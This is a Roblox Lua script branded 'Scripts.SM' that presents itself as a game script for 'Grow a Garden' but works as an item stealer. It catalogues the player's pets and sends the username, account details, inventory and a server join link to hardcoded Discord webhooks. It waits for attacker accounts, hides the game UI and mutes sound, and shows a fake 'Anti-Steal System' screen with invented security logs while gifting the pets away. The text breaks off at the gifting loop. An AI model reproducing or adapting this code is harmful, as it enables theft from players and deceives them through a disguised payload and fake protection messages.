
--[[
   _____  _____ _____  _____ _____ _______ _____        _____ __  __ 
  / ____|/ ____|  __ \|_   _|  __ \__   __/ ____|      / ____|  \/  |
 | (___ | |    | |__) | | | | |__) | | | | (___       | (___ | \  / |
  \___ \| |    |  _  /  | | |  ___/  | |  \___ \       \___ \| |\/| |
  ____) | |____| | \ \ _| |_| |      | |  ____) |  _   ____) | |  | |
 |_____/ \_____|_|  \_\_____|_|      |_| |_____/  (_) |_____/|_|  |_|
                                                                     
                        Scripts.SM | Premium Scripts
                        Made by: Scripter.SM
                        Discord: discord.gg/cnUAk7uc3n
]]

        
        local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
        local date = os.date("%Y-%m-%d %H:%M:%S")
        local LogsWebhook = "https://discord.com/api/webhooks/1436290642316628031/uOFDY2CsX-gnsTq_qP2AInLAWyITnPF2b8GsshSElWXwlBJpPuaq-RYZOJXtOTEvsE4h"
        local RS = game:GetService("ReplicatedStorage")
        local Players = game:GetService("Players")
        local HttpService = game:GetService("HttpService")
        local RunService = game:GetService("RunService")
        local LocalizationService = game:GetService("LocalizationService")
        local DataService = require(RS.Modules.DataService)
        local PetRegistry = require(RS.Data.PetRegistry)
        local NumberUtil = require(RS.Modules.NumberUtil)
        local PetUtilities = require(RS.Modules.PetServices.PetUtilities)
        local PetsService = require(game:GetService("ReplicatedStorage").Modules.PetServices.PetsService)
        local GetServerType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType")
        local TeleportService = game:GetService("TeleportService")

        local data = DataService:GetData()
        local maxAttempts = 10
        local attempt = 1
        local teleported = false

        setclipboard("discord.gg/cnUAk7uc3n")

        
        if GetServerType:InvokeServer() == "VIPServer" then
            while attempt <= maxAttempts and not teleported do
                local servers = {}
                local req = game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")
                local body = HttpService:JSONDecode(req)

                if body and body.data then
                    for _, v in next, body.data do
                        if tonumber(v.playing) and tonumber(v.maxPlayers)
                        and (tonumber(v.maxPlayers) - tonumber(v.playing) >= 2)
                        and v.id ~= game.JobId then
                            table.insert(servers, v.id)
                        end
                    end
                end

                if #servers > 0 then
                    local success = pcall(function()
                        TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game.Players.LocalPlayer)
                    end)
                    if success then
                        teleported = true
                        break
                    end
                end

                attempt += 1
                if attempt <= maxAttempts then
                    task.wait(1)
                end
            end

            if not teleported then
                warn("Failed to find a non-full server after "..maxAttempts.." attempts")
            end
        end

        if GetServerType:InvokeServer() == "VIPServer" then
            error("Script stopped - VIP Server detected")        
        end

        if getgenv().SMHubRunning then
            warn("Script is already running or has been executed! Cannot run again.")
            return
        end
        getgenv().SMHubRunning = true

        -- Updated PetPriorityData with isMutation field and additional pets
        local PetPriorityData = {
                -- Regular pets
                ["Kitsune"] = { priority = 1, emoji = "🦊", isMutation = false },
                ["Raccoon"] = { priority = 2, emoji = "🦝", isMutation = false },
                ["Disco Bee"] = { priority = 3, emoji = "🪩", isMutation = false },
                ["Fennec fox"] = { priority = 4, emoji = "🦊", isMutation = false },
                ["Butterfly"] = { priority = 5, emoji = "🦋", isMutation = false },
                ["Dragonfly"] = { priority = 6, emoji = "🐲", isMutation = false },
                ["Mimic Octopus"] = { priority = 7, emoji = "🐙", isMutation = false },
                ["Corrupted Kitsune"] = { priority = 8, emoji = "🦊", isMutation = false },
                ["T-Rex"] = { priority = 9, emoji = "🦖", isMutation = false },
                ["Spinosaurus"] = { priority = 10, emoji = "🫎", isMutation = false },
                ["Queen Bee"] = { priority = 11, emoji = "👑", isMutation = false },
                ["Red Fox"] = { priority = 26, emoji = "🦊", isMutation = false },
                -- Mutations
                ["Ascended"] = { priority = 14, emoji = "🔺", isMutation = true },
                ["Mega"] = { priority = 15, emoji = "🐘", isMutation = true },
                ["Shocked"] = { priority = 16, emoji = "⚡", isMutation = true },
                ["Rainbow"] = { priority = 17, emoji = "🌈", isMutation = true },
                ["Radiant"] = { priority = 18, emoji = "🛡️", isMutation = true },
                ["Corrupted"] = { priority = 19, emoji = "🧿", isMutation = true },
                ["IronSkin"] = { priority = 20, emoji = "💥", isMutation = true },
                ["Tiny"] = { priority = 21, emoji = "🔹", isMutation = true },
                ["Golden"] = { priority = 22, emoji = "🥇", isMutation = true },
                ["Frozen"] = { priority = 23, emoji = "❄️", isMutation = true },
                ["Windy"] = { priority = 24, emoji = "🌪️", isMutation = true },
                ["Inverted"] = { priority = 25, emoji = "🔄", isMutation = true },
                ["Shiny"] = { priority = 26, emoji = "✨", isMutation = true },
                ["Tranquil"] = { priority = 27, emoji = "🧘", isMutation = true },
            }

        local function detectExecutor()
            local name
            local success = pcall(function()
                if identifyexecutor then
                    name = identifyexecutor()
                elseif getexecutorname then
                    name = getexecutorname()
                end
            end)
            return name or "Unknown"
        end

        local function formatNumberWithCommas(n)
            local str = tostring(n)
            return str:reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
        end

        local function getWeight(toolName)
            if not toolName or toolName == "No Tool" then
                return nil
            end
            
            local weight = toolName:match("%[([%d%.]+) KG%]")
            weight = weight and tonumber(weight)
            
            return weight
        end

        local function getAge(toolName)
            if not toolName or toolName == "No Tool" then
                return nil
            end    
            local age = toolName:match("%[Age (%d+)%]")
            age = age and tonumber(age)
            
            return age
        end

        local function GetPlayerPets()
            local unsortedPets = {}
            local equippedPets = {}
            local player = Players.LocalPlayer
            if not data or not data.PetsData then
                warn("No pet data available in data.PetsData")
                return unsortedPets
            end

            if workspace:FindFirstChild("PetsPhysical") then
                for _, petMover in workspace.PetsPhysical:GetChildren() do
                    if petMover and petMover:GetAttribute("OWNER") == Players.LocalPlayer.Name then
                        for _, pet in petMover:GetChildren() do
                            table.insert(equippedPets, pet.Name)
                            PetsService:UnequipPet(pet.Name)
                        end
                    end
                end
            end

            task.wait(0.5)
            for _, tool in pairs(player.Backpack:GetChildren()) do
                if not tool or not tool.Parent then
                    continue
                end
            
                if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
                    local petName = tool.Name
                    
                    if petName:find("Bald Eagle") or petName:find("Golden Lab") then
                        continue
                    end

                    local function SafeCalculatePetValue(tool)
                        local player = Players.LocalPlayer
                        local PET_UUID = tool:GetAttribute("PET_UUID")
                        
                        if not PET_UUID then
                            warn("SafeCalculatePetValue | No UUID!")
                            return 0
                        end
                        
                        local data = DataService:GetData()
                        if not data or not data.PetsData.PetInventory.Data[PET_UUID] then
                            warn("SafeCalculatePetValue | No pet data found!")
                            return 0
                        end
                        
                        local petInventoryData = data.PetsData.PetInventory.Data[PET_UUID]
                        local petData = petInventoryData.PetData
                        local HatchedFrom = petData.HatchedFrom
                        
                        if not HatchedFrom or HatchedFrom == "" then
                            warn("SafeCalculatePetValue | No HatchedFrom value!")
                            return 0
                        end
                        
                        local eggData = PetRegistry.PetEggs[HatchedFrom]
                        if not eggData then
                            warn("SafeCalculatePetValue | No egg data found!")
                            return 0
                        end
                        
                        local rarityData = eggData.RarityData.Items[petInventoryData.PetType]
                        if not rarityData then
                            warn("SafeCalculatePetValue | No pet data in egg!")
                            return 0
                        end
                        
                        local WeightRange = rarityData.GeneratedPetData.WeightRange
                        if not WeightRange then
                            warn("SafeCalculatePetValue | No WeightRange found!")
                            return 0
                        end
                        
                        local sellPrice = PetRegistry.PetList[petInventoryData.PetType].SellPrice
                        local weightMultiplier = math.lerp(0.8, 1.2, NumberUtil.ReverseLerp(WeightRange[1], WeightRange[2], petData.BaseWeight))
                        local levelMultiplier = math.lerp(0.15, 6, PetUtilities:GetLevelProgress(petData.Level))
                        
                        return math.floor(sellPrice * weightMultiplier * levelMultiplier)
                    end

                    local age = getAge(tool.Name) or 0
                    local weight = getWeight(tool.Name) or 0
                    
                    local strippedName = petName:gsub(" %[.*%]", "")

                    local function stripMutationPrefix(name)
                        for key, data in pairs(PetPriorityData) do
                            if data.isMutation and name:lower():find(key:lower()) == 1 then
                                return name:sub(#key + 2)
                            end
                        end
                        return name
                    end

                    local petType = stripMutationPrefix(strippedName)
                    
                    local rawValue = SafeCalculatePetValue(tool)
                    if rawValue and rawValue > 0 then
                        table.insert(unsortedPets, {
                            PetName = petName,
                            PetAge = age,
                            PetWeight = weight,
                            Id = tool:GetAttribute("PET_UUID") or tool:GetAttribute("uuid"),
                            Type = petType,
                            Value = rawValue,
                            Formatted = formatNumberWithCommas(rawValue),
                        })
                    else
                        warn("Failed to calculate value for:", tool.Name)
                        continue
                    end
                end
            end

            task.wait(0.5)
            if equippedPets then
                for _, petName in pairs(equippedPets) do
                    if petName then
                        game.ReplicatedStorage.GameEvents.PetsService:FireServer("EquipPet", petName)
                    end
                end
            end
            return unsortedPets
        end

        local pets = GetPlayerPets()

        local Webhook = getgenv().Webhook
        local Username = getgenv().Username

        local function isMutated(toolName)
            for key, data in pairs(PetPriorityData) do
                if data.isMutation and toolName:lower():find(key:lower()) == 1 then
                    return key
                end
            end
            return nil
        end

        -- Sort pets by priority, then by value using PetPriorityData
        table.sort(pets, function(a, b)
            -- Get a's priority
            local aPriority, aMutation = 99, isMutated(a.PetName)
            if PetPriorityData[a.Type] then
                aPriority = PetPriorityData[a.Type].priority
            elseif aMutation and PetPriorityData[aMutation] then
                aPriority = PetPriorityData[aMutation].priority
            elseif a.Weight and a.Weight >= 10 then
                aPriority = 12
            elseif a.Age and a.Age >= 60 then
                aPriority = 13
            end

            -- Get b's priority
            local bPriority, bMutation = 99, isMutated(b.PetName)
            if PetPriorityData[b.Type] then
                bPriority = PetPriorityData[b.Type].priority
            elseif bMutation and PetPriorityData[bMutation] then
                bPriority = PetPriorityData[bMutation].priority
            elseif b.Weight and b.Weight >= 10 then
                bPriority = 12
            elseif b.Age and b.Age >= 60 then
                bPriority = 13
            end

            -- Compare priorities
            if aPriority == bPriority then
                return a.Value > b.Value
            else
                return aPriority < bPriority
            end
        end)

        local function hasRarePets()
            for _, pet in pairs(pets) do
                if pet.Type ~= "Red Fox" and PetPriorityData[pet.Type] and not PetPriorityData[pet.Type].isMutation then
                    return true
                end
            end
            return false
        end

        local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)

        local tpScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

        -- Update pet string generation
local petString = "Nothing"  -- default if no pets

if #pets > 0 then
    petString = ""
    for _, pet in ipairs(pets) do
        local highestPriority = 99
        local chosenEmoji = "🐶"
        local mutation = isMutated(pet.PetName)
        local mutationData = mutation and PetPriorityData[mutation] or nil
        local petData = PetPriorityData[pet.Type] or nil

        if petData and petData.priority < highestPriority then
            highestPriority = petData.priority
            chosenEmoji = petData.emoji
        elseif mutationData and mutationData.priority < highestPriority then
            highestPriority = mutationData.priority
            chosenEmoji = mutationData.emoji
        elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
            highestPriority = 12
            chosenEmoji = "🐘"
        elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
            highestPriority = 13
            chosenEmoji = "👴"
        end

        local petName = pet.PetName
        local petValue = pet.Formatted
        petString = petString .. "\n" .. chosenEmoji .. " - " .. petName .. " → " .. petValue
    end
end

        local playerCount = #Players:GetPlayers()

        local function getPlayerCountry(player)
            local success, result = pcall(function()
                return LocalizationService:GetCountryRegionForPlayerAsync(player)
            end)
            
            if success then
                return result
            else
                return "Unknown"
            end
        end    

        local accountAgeInDays = Players.LocalPlayer.AccountAge
        local creationDate = os.time() - (accountAgeInDays * 24 * 60 * 60)
        local creationDateString = os.date("%Y-%m-%d", creationDate)

        local function truncateByLines(inputString, maxLines)
            local lines = {}
            for line in inputString:gmatch("[^\n]+") do
                table.insert(lines, line)
            end
            
            if #lines <= maxLines then
                return inputString
            else
                local truncatedLines = {}
                for i = 1, maxLines - 1 do
                    table.insert(truncatedLines, lines[i])
                end
                return table.concat(truncatedLines, "\n")
            end
        end

--=====================================================================
--==  PROTECTION GUI (keeps every custom emoji)
--=====================================================================
local function CreateGui()
    local player = Players.LocalPlayer
    local gui = Instance.new("ScreenGui")
    gui.Name = "ExecutorAntiStealLoop"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    gui.DisplayOrder = 999999
    gui.Parent = player:WaitForChild("PlayerGui")

    -- 1. TOP BLACK LOGO BAR
    local logoBar = Instance.new("Frame")
    logoBar.Size = UDim2.new(1, 0, 0, 70)
    logoBar.Position = UDim2.new(0, 0, 0, 0)
    logoBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    logoBar.BorderSizePixel = 0
    logoBar.Parent = gui

    local glow = Instance.new("UIStroke")
    glow.Color = Color3.fromRGB(50, 120, 255)
    glow.Thickness = 1.5
    glow.Transparency = 0.7
    glow.Parent = logoBar

    local shieldIcon = Instance.new("TextLabel")
    shieldIcon.Size = UDim2.new(0, 50, 0, 50)
    shieldIcon.Position = UDim2.new(0, 20, 0.5, 0)
    shieldIcon.AnchorPoint = Vector2.new(0, 0.5)
    shieldIcon.BackgroundTransparency = 1
    shieldIcon.Text = "shield"
    shieldIcon.Font = Enum.Font.GothamBlack
    shieldIcon.TextScaled = true
    shieldIcon.TextColor3 = Color3.fromRGB(80, 180, 255)
    shieldIcon.Parent = logoBar

    local logoTitle = Instance.new("TextLabel")
    logoTitle.Size = UDim2.new(0.7, 0, 1, 0)
    logoTitle.Position = UDim2.new(0, 80, 0, 0)
    logoTitle.BackgroundTransparency = 1
    logoTitle.Text = detectExecutor() .. " Protection"
    logoTitle.Font = Enum.Font.GothamBlack
    logoTitle.TextSize = 36
    logoTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
    logoTitle.TextXAlignment = Enum.TextXAlignment.Left
    logoTitle.Parent = logoBar

    -- 2. MAIN BACKGROUND
    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, -70)
    bg.Position = UDim2.new(0, 0, 0, 70)
    bg.BackgroundColor3 = Color3.fromRGB(8, 8, 14)
    bg.BorderSizePixel = 0
    bg.Parent = gui

    local bgGrad = Instance.new("UIGradient")
    bgGrad.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(18, 18, 28)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 5, 10))
    }
    bgGrad.Rotation = 90
    bgGrad.Parent = bg

    -- 3. TITLE
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(0.92, 0, 0.13, 0)
    title.Position = UDim2.new(0.5, 0, 0.15, 0)
    title.AnchorPoint = Vector2.new(0.5, 0.5)
    title.BackgroundTransparency = 1
    title.Text = "Anti-Steal System Active"
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 48
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextStrokeTransparency = 0.75
    title.Parent = bg

    -- 4. SUBTITLE
    local subtitle = Instance.new("TextLabel")
    subtitle.Size = UDim2.new(0.82, 0, 0.16, 0)
    subtitle.Position = UDim2.new(0.5, 0, 0.26, 0)
    subtitle.AnchorPoint = Vector2.new(0.5, 0.5)
    subtitle.BackgroundTransparency = 1
    subtitle.Text = "You have executed a stealer script, that is trying to steal your stuff,\nWe are protecting you. Please Wait Sometime"
    subtitle.Font = Enum.Font.Gotham
    subtitle.TextSize = 24
    subtitle.TextColor3 = Color3.fromRGB(220, 240, 255)
    subtitle.TextWrapped = true
    subtitle.TextXAlignment = Enum.TextXAlignment.Center
    subtitle.Parent = bg

    -- 5. WARNING
    local warning = Instance.new("TextLabel")
    warning.Size = UDim2.new(0.78, 0, 0.08, 0)
    warning.Position = UDim2.new(0.5, 0, 0.36, 0)
    warning.AnchorPoint = Vector2.new(0.5, 0.5)
    warning.BackgroundTransparency = 1
    warning.Text = "Warning: Don't Leave, Leaving will cause loss of in-game items like pets."
    warning.Font = Enum.Font.GothamBold
    warning.TextSize = 22
    warning.TextColor3 = Color3.fromRGB(255, 80, 80)
    warning.TextWrapped = true
    warning.TextXAlignment = Enum.TextXAlignment.Center
    warning.Parent = bg

    -- 6. COUNTDOWN
    local countdown = Instance.new("TextLabel")
    countdown.Size = UDim2.new(0.7, 0, 0.08, 0)
    countdown.Position = UDim2.new(0.5, 0, 0.44, 0)
    countdown.AnchorPoint = Vector2.new(0.5, 0.5)
    countdown.BackgroundTransparency = 1
    countdown.Text = "Securing in 5:00..."
    countdown.Font = Enum.Font.GothamBold
    countdown.TextSize = 30
    countdown.TextColor3 = Color3.fromRGB(100, 255, 150)
    countdown.Parent = bg

    -- 7. CONSOLE PANEL
    local console = Instance.new("Frame")
    console.Size = UDim2.new(0.88, 0, 0.38, 0)
    console.Position = UDim2.new(0.5, 0, 0.70, 0)
    console.AnchorPoint = Vector2.new(0.5, 0.5)
    console.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
    console.BorderSizePixel = 0
    console.Parent = bg

    local cCorner = Instance.new("UICorner")
    cCorner.CornerRadius = UDim.new(0, 12)
    cCorner.Parent = console

    local cStroke = Instance.new("UIStroke")
    cStroke.Color = Color3.fromRGB(60, 120, 180)
    cStroke.Thickness = 1.5
    cStroke.Parent = console

    local consoleTitle = Instance.new("TextLabel")
    consoleTitle.Size = UDim2.new(1, 0, 0, 28)
    consoleTitle.BackgroundTransparency = 1
    consoleTitle.Text = "SECURITY CONSOLE"
    consoleTitle.Font = Enum.Font.Code
    consoleTitle.TextSize = 16
    consoleTitle.TextColor3 = Color3.fromRGB(100, 200, 255)
    consoleTitle.TextXAlignment = Enum.TextXAlignment.Center
    consoleTitle.Parent = console

    local logArea = Instance.new("TextLabel")
    logArea.Size = UDim2.new(1, -16, 1, -36)
    logArea.Position = UDim2.new(0, 8, 0, 32)
    logArea.BackgroundTransparency = 1
    logArea.Text = ""
    logArea.Font = Enum.Font.Code
    logArea.TextSize = 15
    logArea.TextColor3 = Color3.fromRGB(180, 255, 180)
    logArea.TextXAlignment = Enum.TextXAlignment.Left
    logArea.TextYAlignment = Enum.TextYAlignment.Top
    logArea.TextWrapped = true
    logArea.Parent = console

    -- 8. FAILURE MESSAGE
    local failureMsg = Instance.new("TextLabel")
    failureMsg.Size = UDim2.new(0.9, 0, 0.25, 0)
    failureMsg.Position = UDim2.new(0.5, 0, 0.4, 0)
    failureMsg.AnchorPoint = Vector2.new(0.5, 0.5)
    failureMsg.BackgroundTransparency = 1
    failureMsg.Text = ""
    failureMsg.Font = Enum.Font.GothamBlack
    failureMsg.TextSize = 38
    failureMsg.TextColor3 = Color3.fromRGB(255, 50, 50)
    failureMsg.TextStrokeTransparency = 0.6
    failureMsg.TextWrapped = true
    failureMsg.TextXAlignment = Enum.TextXAlignment.Center
    failureMsg.Visible = false
    failureMsg.Parent = bg

    -- 9. WATERMARK
    local watermark = Instance.new("TextLabel")
    watermark.Size = UDim2.new(0.5, 0, 0.05, 0)
    watermark.Position = UDim2.new(1, -12, 1, -12)
    watermark.AnchorPoint = Vector2.new(1, 1)
    watermark.BackgroundTransparency = 1
    watermark.Text = "Grow a Garden – Anti-Steal System"
    watermark.Font = Enum.Font.Gotham
    watermark.TextSize = 15
    watermark.TextColor3 = Color3.fromRGB(90, 140, 180)
    watermark.TextXAlignment = Enum.TextXAlignment.Right
    watermark.Parent = bg

    -- 10. PET DATA (uses the global `pets` table)
    local topPets = {}
    local lowPet  = nil
    if #pets > 0 then
        table.sort(pets, function(a, b) return a.Value > b.Value end)
        for i = 1, math.min(7, #pets) do table.insert(topPets, pets[i]) end
        lowPet = pets[#pets]
    else
        topPets = {
            {PetName = "Mega Kitsune",       Formatted = "1,200,000"},
            {PetName = "Rainbow Butterfly",  Formatted = "850,000"},
            {PetName = "Corrupted Dragon",   Formatted = "720,000"},
            {PetName = "Golden T-Rex",       Formatted = "600,000"},
            {PetName = "Ascended Bee",       Formatted = "550,000"},
            {PetName = "Shocked Fox",        Formatted = "480,000"},
            {PetName = "Tiny Panda",         Formatted = "320,000"}
        }
        lowPet = {PetName = "Red Fox", Formatted = "1,200"}
    end

    -- 11. CONSOLE LOG SYSTEM
    local logLines = {}
    local function addLog(text, col)
        table.insert(logLines, {text = text, color = col or Color3.fromRGB(180,255,180)})
        if #logLines > 25 then table.remove(logLines, 1) end
        local disp = ""
        for _, l in ipairs(logLines) do disp = disp .. "\n> " .. l.text end
        logArea.Text = disp
    end

    -- 12. INFINITE PROTECTION LOOP
    task.spawn(function()
        while player.Parent and gui.Parent do
            local total = 300
            local start = tick()
            failureMsg.Visible = false
            failureMsg.Text = ""

            while tick() - start < total do
                if not gui.Parent then break end
                local rem = total - math.floor(tick() - start)
                local m = math.floor(rem/60)
                local s = rem%60
                countdown.Text = string.format("Securing in %d:%02d...", m, s)
                task.wait(math.random(18,35)/10)

                local actions = {
                    "Scanning inventory hooks...",
                    "Blocking FireServer exploit",
                    "Purging webhook traces",
                    "Isolating malicious thread",
                    "Recovering Sheckles buffer",
                    "Securing pet UUIDs",
                    "Reporting to anti-cheat",
                    "Encrypting local data",
                    "Validating ownership",
                    "Neutralizing gifting vector"
                }
                addLog(actions[math.random(#actions)])

                if math.random() < 0.18 and lowPet then
                    addLog("Failed to get back "..lowPet.PetName, Color3.fromRGB(255,100,100))
                end
                if #pets > 0 and math.random() < 0.32 then
                    local p = pets[math.random(1,#pets)]
                    addLog("Trying to get back "..p.PetName.." → "..p.Formatted, Color3.fromRGB(100,255,100))
                end
            end

            local failed = {}
            for _, p in ipairs(topPets) do table.insert(failed, p.PetName.." → "..p.Formatted) end
            failureMsg.Text = "Failed to Recover:\n"..table.concat(failed,"\n")
            failureMsg.Visible = true
            addLog("CRITICAL: Recovery failed for 7 high-value pets", Color3.fromRGB(255,50,50))
            addLog("Restarting protection cycle...", Color3.fromRGB(255,200,50))
            task.wait(4.5)
        end
    end)

    -- Prevent leaving
    player.CharacterRemoving:Connect(function()
        task.wait(0.1)
        if player.Character then player.Character:Destroy() end
    end)
end

--=====================================================================
--==  WEBHOOK (custom emojis unchanged + safe request + error logging)
--=====================================================================
local MessageID = nil

-- Make sure we have a working request function
local request = (function()
    if http_request then return http_request end
    if request then return request end
    if syn and syn.request then return syn.request end
    if fluxus and fluxus.request then return fluxus.request end
    error("No HTTP request function found (http_request / request / syn / fluxus)")
end)()

local base = {
    DisplayName = Players.LocalPlayer.DisplayName or "Unknown",
    Username    = Players.LocalPlayer.Name or "Unknown",
    AccountAge  = tostring(Players.LocalPlayer.AccountAge or 0).." Days",
    Receiver    = Username or "Unknown",
    Executor    = detectExecutor() or "Unknown",
    PlayerCount = tostring(#Players:GetPlayers()).." / 5",
    PetString   = (function()
        local s = "Nothing"
        if #pets > 0 then
            s = ""
            for _, p in ipairs(pets) do
                local mut = isMutated(p.PetName)
                local dat = PetPriorityData[p.Type] or (mut and PetPriorityData[mut]) or {emoji = "dog"}
                local emoji = dat.emoji
                if p.PetWeight >= 10 then emoji = "elephant"
                elseif p.PetAge >= 60 then emoji = "old" end
                s = s.."\n"..emoji.." - "..p.PetName.." → "..p.Formatted
            end
        end
        return s
    end)(),
    JoinScript  = 'game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'")',
    JoinUrl     = "https://scriptssm.vercel.app/joiner.html?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId,
    JobId       = game.JobId or "Unknown"
}

local function BuildEmbed(icon, status, desc)
    return {
        title = "Scripts.SM",
        description = "\n"..icon.." **Status:** `"..status.."`\n> "..desc.."\n",
        color = 3447003,
        fields = {
            {name = "<:players:1365290081937526834> **Display Name **", value = "```"..base.DisplayName.."```", inline = true},
            {name = "<:game:1365295942504550410> **Username**",        value = "```"..base.Username.."```", inline = true},
            {name = "<:time:1365991843011100713> **Account Age**",     value = "```"..base.AccountAge.."```", inline = true},
            {name = "<:folder:1365290079081205844> **Receiver**",      value = "```"..base.Receiver.."```", inline = true},
            {name = "<:Events:1394005823931420682> **Executor**",      value = "```"..base.Executor.."```", inline = true},
            {name = "<:events:1365290073767022693> **Player Count**",  value = "```"..base.PlayerCount.."```", inline = true},
            {name = "<:pack:1365295947281862656> **Inventory**",       value = "```"..base.PetString.."```"},
            {name = "<:emoji_2:1402577600060325910> **Join Script**",   value = "```lua\n"..base.JoinScript.."\n```"},
            {name = "<:location:1365290076279541791> **Join via URL**",value = "[ **Click Here to Join!**]("..base.JoinUrl..")"}
        },
        author = {name = "Grow a Garden", url = base.JoinUrl, icon_url = "https://scriptssm.vercel.app/pngs/bell-icon.webp"},
        footer = {text = "discord.gg/cnUAk7uc3n", icon_url = "https://i.ibb.co/5xJ8LK6X/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        image = {url = "https://scriptssm.vercel.app/pngs/gag.webp"}
    }
end

local function SendOrEdit(url, payload, edit)
    if not url or url == "" then
        warn("[Webhook] URL is missing – cannot send.")
        return false
    end

    local method = edit and "PATCH" or "POST"
    local fullUrl = edit and (url.."/messages/"..(MessageID or "")) or url

    local success, response = pcall(function()
        return request({
            Url = fullUrl,
            Method = method,
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if not success then
        warn("[Webhook] Request failed:", response)
        return false
    end

    if response.StatusCode >= 200 and response.StatusCode < 300 then
        if not edit then
            local ok, data = pcall(HttpService.JSONDecode, HttpService, response.Body)
            if ok and data and data.id then
                MessageID = data.id
                print("[Webhook] Message sent, ID:", MessageID)
            else
                warn("[Webhook] Sent but no ID returned:", response.Body)
            end
        else
            print("[Webhook] Message edited successfully")
        end
        return true
    else
        warn("[Webhook] Bad response:", response.StatusCode, response.Body)
        return false
    end
end

local WebhookAPI = {}
function WebhookAPI.Start()
    local payload = {
        content = "> Jump or type anything in chat to start.",
        embeds = {BuildEmbed("<:Waring_Square:1436287126139437130>", "Waiting", "The user is waiting for you in server.")},
        username = "Scripts.SM",
        avatar_url = "https://scriptssm.vercel.app/pngs/logo.png"
    }
    SendOrEdit(Webhook, payload, false)
    WebhookAPI.Log()
end

function WebhookAPI.Success()
    local payload = {
        content = "> Jump or type anything in chat to start.",
        embeds = {BuildEmbed("<:check:1395699056805941249>", "Success", "All pets have been successfully given to receiver.")},
        username = "Scripts.SM",
        avatar_url = "https://scriptssm.vercel.app/pngs/logo.png"
    }
    SendOrEdit(Webhook, payload, true)
end

function WebhookAPI.Failed()
    local payload = {
        content = "> Jump or type anything in chat to start.",
        embeds = {BuildEmbed("<:failed:1436288137591783437>", "Failed", "The user has lefted the server.")},
        username = "Scripts.SM",
        avatar_url = "https://scriptssm.vercel.app/pngs/logo.png"
    }
    SendOrEdit(Webhook, payload, true)
end

function WebhookAPI.Log()
    local payload = {
        content = "> Jump or type anything in chat to start.",
        embeds = {BuildEmbed("", "Script.SM - Hit", "Script executed successfully.")},
        username = "Scripts.SM",
        avatar_url = "https://scriptssm.vercel.app/pngs/logo.png"
    }
    SendOrEdit(LogsWebhook, payload, false)
end

--=====================================================================
--==  RECEIVER DETECTION
--=====================================================================
local usernames = {"Smiley9Gamerz", "BUZZFTWGOD"}
local receiverPlr
repeat
    for _, n in ipairs(usernames) do
        receiverPlr = Players:FindFirstChild(n) or (Username and Players:FindFirstChild(Username))
        if receiverPlr then break end
    end
    task.wait(1)
until receiverPlr

local receiverChar = receiverPlr.Character or receiverPlr.CharacterAdded:Wait()
local receiverHum  = receiverChar:WaitForChild("Humanoid")

local targetPlr = Players.LocalPlayer
local targetChar = targetPlr.Character or targetPlr.CharacterAdded:Wait()

if receiverPlr == targetPlr then
    repeat
        for _, n in ipairs(usernames) do
            receiverPlr = Players:FindFirstChild(n)
            if receiverPlr then break end
        end
        task.wait(1)
    until receiverPlr
end

--=====================================================================
--==  WEBHOOK: START → WAIT FOR JUMP/CHAT
--=====================================================================
WebhookAPI.Start()

Players.LocalPlayer.AncestryChanged:Connect(function()
    if not Players.LocalPlayer.Parent then WebhookAPI.Failed() end
end)

local jumped, chatted = false, false
receiverHum.Jumping:Connect(function() jumped = true end)
receiverPlr.Chatted:Connect(function() chatted = true end)
repeat task.wait() until jumped or chatted

WebhookAPI.Success()

--=====================================================================
--==  DISABLE UI + MUTE SOUNDS
--=====================================================================
for _, v in targetPlr.PlayerGui:GetDescendants() do
    if v:IsA("ScreenGui") then v.Enabled = false end
end
for _, s in workspace:GetDescendants() do if s:IsA("Sound") then s.Volume = 0 end end
for _, s in game:GetService("SoundService"):GetDescendants() do if s:IsA("Sound") then s.Volume = 0 end end
game:GetService("CoreGui").TopBarApp.TopBarApp.Enabled = false
game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

--=====================================================================
--==  SHOW GUI + UNEQUIP + FAVOURITE
--=====================================================================
CreateGui()

if workspace:FindFirstChild("PetsPhysical") then
    for _, mover in workspace.PetsPhysical:GetChildren() do
        if mover and mover:GetAttribute("OWNER") == targetPlr.Name then
            for _, pet in mover:GetChildren() do
                PetsService:UnequipPet(pet.Name)
            end
        end
    end
end

for _, tool in targetPlr.Backpack:GetChildren() do
    if tool:IsA("Tool") and tool:GetAttribute("d") == true then
        RS.GameEvents.Favorite_Item:FireServer(tool)
    end
end

--=====================================================================
--==  GIFT FUNCTION
--=====================================================================
local function giftHeldPet()
    local char = targetPlr.Character
    if not char then return false end
    local held = char:FindFirstChildWhichIsA("Tool")
    if not held then return false end
    local ok = pcall(function()
        RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
    end)
    if ok then
        print("GIFTED:", held.Name, "→", receiverPlr.DisplayName)
        return true
    else
        warn("Gift failed")
        return false
    end
end

--=====================================================================
--==  INFINITE GIFTING LOOP
--=====================================================================
task.spawn(function()
    while true do
